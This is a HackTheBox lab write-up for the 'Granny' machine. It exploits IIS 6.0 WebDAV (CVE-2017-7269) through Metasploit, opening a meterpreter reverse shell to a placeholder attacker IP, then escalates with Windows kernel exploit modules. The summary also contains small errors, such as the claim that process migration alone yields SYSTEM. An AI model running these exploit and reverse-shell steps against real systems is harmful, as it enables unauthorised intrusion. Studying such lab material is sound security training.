# Granny - HackTheBox Writeup (Anonymized)

## Machine Info
- **Name:** Granny
- **OS:** Windows Server 2003 R2
- **Difficulty:** Easy
- **Target IP:** X.X.X.X
- **Attacker IP:** Y.Y.Y.Y

---

## 1. Reconnaissance

### Initial Nmap Scan

```bash
nmap -sC -sv -oA granny X.X.X.X
```

**Results:**
```
80/tcp open  http    Microsoft IIS httpd 6.0
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Type: Microsoft-IIS/6.0
|_  Server Date: Sun, 16 Aug 2026 05:34:32 GMT
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-title: Under Construction
|_http-server-header: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

**Key Finding:**
- . IIS 6.0 with WebDAV enabled
- . Vulnerable to CVE-2017-7269

---

## 2. Exploitation

### Method 1: Metasploit

```
msfconsole -q

use exploit/windows/iis/iis_webdav_scstoragepathfromurl
set RHOSTS X.X.X.X
set LHOST Y.Y.Y.Y
set LPORT 4444
set PAYLOAD windows/meterpreter/reverse_tcp
set TARGET 0
run
```

---

## 3. Post-Exploitation

### Initial Access

```bash
getuid
# Server username: NT AUTHORITY\NETWORK SERVICE
```

### Process Migration

```bash
# List processes
ps

# Migrate to davcdata.exe (NETWORK SERVICE)
migrate <PID_of_davcdata.exe>
```

---

## 5. Privilege Escalation

### Check Local Exploits

```
background
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

### Vulnerable Exploits Found:
```
1. ms10_015_kitrap0d
2. ms14_058_track_popup_menu
3. ms14_070_tcpip_ioctl
4. ms15_051_client_copy_image
5. ms16_016_webdav
6. ppr_flatten_rec
```

### Attempt Local Exploits

```
use exploit/windows/local/ms14_058_track_popup_menu
set SESSION 2
set LHOST Y.Y.Y.Y
set LPORT 5555
run

use exploit/windows/local/ms15_051_client_copy_image
set SESSION 2
set LHOST Y.Y.Y.Y
set LPORT 5555
run
```

---

## 6. Capture Flags

### User Flag

```bash
cat "c:\Documents and Settings\Lakis\Desktop\user.txt"
```

### Root Flag

```bash
cat "c:\Documents and Settings\Administrator\Desktop\root.txt"
```

---

## Summary

Granny demonstrates:

1. **CVE-2017-7269**: IIS 6.0 WebDAV buffer overflow
2. **Process Migration**: Moving from low privilege to NT AUTHORITY\SYSTEM
3. **Local Privilege Escalation**: Multiple Windows kernel exploits available
4. **Meterpreter Usage**: Essential Windows post-exploitation tool

**Key Takeaways:**
- IIS 6.0 with WebDAV is highly vulnerable
- Always check process list for migration targets
- Windows local exploits can be finicky - try multiple
- Use search -f for finding flags in Windows

---

## Tools Used
- Nmap
- Metasploit
-  SearchSploit
-  Meterpreter
